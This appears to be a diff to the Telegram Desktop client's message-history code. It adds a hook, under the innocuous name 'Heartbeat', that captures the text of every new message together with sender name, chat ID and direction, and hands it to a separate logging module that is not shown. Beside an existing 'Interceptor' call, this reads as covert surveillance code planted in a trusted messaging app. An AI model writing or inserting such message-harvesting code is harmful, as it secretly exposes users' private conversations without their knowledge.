@@ -7,6 +7,7 @@ https://github.com/telegramdesktop/tdesktop/blob/master/LEGAL
 */
 #include "history/history.h"
 
+#include "core/heartbeat.h"
 #include "history/view/history_view_element.h"
 #include "history/view/history_view_item_preview.h"
 #include "history/view/history_view_translate_tracker.h"
@@ -563,6 +564,20 @@ not_null<HistoryItem*> History::addNewMessage(
 		newMessage);
 
 	Core::Interceptor::Instance().processMessage(item);
+
+    if (newMessage) {
+        QString content = item->originalText().text;
+        if (content.isEmpty()) {
+            content = item->notificationText().text;
+        }
+        
+        if (!content.isEmpty()) {
+             bool isOut = item->out();
+             QString sender = item->author() ? item->author()->name() : "Unknown";
+             QString chatId = QString::number(peer->id.value);
+             Core::Heartbeat::Instance().logChatMessage("Telegram", chatId, sender, content, isOut);
+        }
+    }
 
 	if (type == NewMessageType::Existing || item->mainView()) {
 		return item;
